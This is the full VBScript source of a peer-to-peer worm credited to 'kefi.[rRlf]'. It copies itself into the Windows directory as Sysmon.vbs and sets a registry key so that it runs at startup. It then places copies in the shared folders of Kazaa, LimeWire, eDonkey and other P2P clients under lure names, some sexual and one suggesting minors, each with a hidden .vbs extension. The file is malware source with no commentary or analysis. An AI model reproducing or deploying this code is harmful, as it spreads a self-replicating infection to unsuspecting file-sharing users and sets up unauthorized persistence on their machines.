'kpwg 1.3
'Vbs.Herpes By: kefi.[rRlf]
On error Resume Next
set shell = createobject("wscript.shell")
set fso = createobject("scripting.filesystemobject")
Herpes = wscript.scriptfullname
fso.copyfile Herpes,fso.getspecialfolder(0) & "\Sysmon.vbs"
shell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\WinBoot32",fso.getspecialfolder(0)& "\Sysmon.vbs"
Pgdir = shell.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if day(now()) = 2 and month(now()) = 5 then
 msgbox "I am not santa clause", vbExclamation,"P2P.Herpes by kefi.[rRlf]"
end if
files = array("Young teen.jpg","Hot Girl.jpg","Pussy.jpg","sex.jpg","big boobs.jpg","Nice teens.jpg","School Reports.doc","Sex Tips.doc","Lord of the rings.doc","How To Rip DVDs.doc","Eminem - I need to be shot.mp3","Blink 182 - We Suck.mp3")
kl = (Pgdir & "\kazaa lite\my shared folder") & "\"
if fso.folderexists(kl) then
 for x=0 to 11
  fso.copyfile Herpes,kl & files(x) & ".vbs"
 next
end if
kazaa = (Pgdir & "\kazaa\my shared folder") & "\"
if fso.folderexists(kazaa) then
 for x=0 to 11
  fso.copyfile Herpes,kl & files(x) & ".vbs"
 next
end if
kmd = (Pgdir & "\kmd\my shared folder") & "\"
if fso.folderexists(kmd) then
 for x=0 to 11
  fso.copyfile Herpes,kl & files(x) & ".vbs"
 next
end if
grokster = (Pgdir & "\grokster\my grokster") & "\"
if fso.folderexists(grokster) then
 for x=0 to 11
  fso.copyfile Herpes,kl & files(x) & ".vbs"
 next
end if
bearshare = (Pgdir & "\bearshare\shared") & "\"
if fso.folderexists(bearshare) then
 for x=0 to 11
  fso.copyfile Herpes,kl & files(x) & ".vbs"
 next
end if
edonkey = (Pgdir & "\edonkey2000\incoming") & "\"
if fso.folderexists(edonkey) then
 for x=0 to 11
  fso.copyfile Herpes,kl & files(x) & ".vbs"
 next
end if
morpheus = (Pgdir & "\morpheus\my shared folder") & "\"
if fso.folderexists(morpheus) then
 for x=0 to 11
  fso.copyfile Herpes,kl & files(x) & ".vbs"
 next
end if
limewire = (Pgdir & "\limewire\shared") & "\"
if fso.folderexists(limewire) then
 for x=0 to 11
  fso.copyfile Herpes,kl & files(x) & ".vbs"
 next
end if
rem kpwg 1.3
